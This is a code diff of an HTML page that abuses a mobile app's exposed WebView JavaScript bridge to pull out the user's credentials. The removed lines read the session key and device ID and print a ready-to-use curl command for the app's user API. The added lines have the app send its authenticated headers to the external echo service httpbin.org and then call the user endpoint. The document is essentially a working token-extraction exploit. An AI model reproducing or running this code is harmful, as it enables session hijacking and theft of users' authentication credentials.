@@ -1,7 +1,7 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
   <html>
-  <head><title>Token</title><meta charset="utf-8"></head>
-  <body style="background:#000;color:#0f0;font:11px monospace;padding:10px">
+  <head><title>Headers</title><meta charset="utf-8"></head>
+  <body style="background:#000;color:#0f0;font:10px monospace;padding:10px">
   <pre id="s">Loading...</pre>
   <script>
   var B = window.B612KajiBridgeInterface;
@@ -10,27 +10,27 @@
   if (B) {
       s.textContent = 'Bridge OK\n\n';
 
-      window.c1 = function(d) {
+      window.headersCB = function(d) {
           var x = typeof d === 'string' ? JSON.parse(d) : d;
-
-          s.textContent += '=== SESSION KEY (URL encoded) ===\n';
-          var sk = x.sessionKey || '';
-          var encoded = encodeURIComponent(sk);
-          for (var i = 0; i < encoded.length; i += 50) {
-              s.textContent += encoded.substring(i, i + 50) + '\n';
-          }
-
-          s.textContent += '\n=== CURL COMMAND ===\n';
-          s.textContent += 'curl -X POST "https://user-snow-api.snow.me/v1/user/me" -H "Authorization: ' +
-   sk + '" -H "X-DUID: ';
+          s.textContent += '=== HEADERS SENT BY APP ===\n';
+          s.textContent += JSON.stringify(x, null, 2) + '\n';
       };
-      B.getUserSession('c1');
 
-      window.c2 = function(d) {
+      B.apiRequest('headersCB', JSON.stringify({
+          url: 'https://httpbin.org/anything',
+          method: 'GET'
+      }));
+
+      window.cb = function(d) {
           var x = typeof d === 'string' ? JSON.parse(d) : d;
-          s.textContent += (x.duid || '') + '" -H "Content-Type: application/json" -d "{}"\n';
+          s.textContent += '\n=== API RESPONSE ===\n';
+          s.textContent += JSON.stringify(x, null, 2) + '\n';
       };
-      B.appInfo('c2');
+
+      B.apiRequest('cb', JSON.stringify({
+          url: 'https://user-snow-api.snow.me/v1/user/me',
+          method: 'POST'
+      }));
 
   } else {
       s.textContent = 'No Bridge';
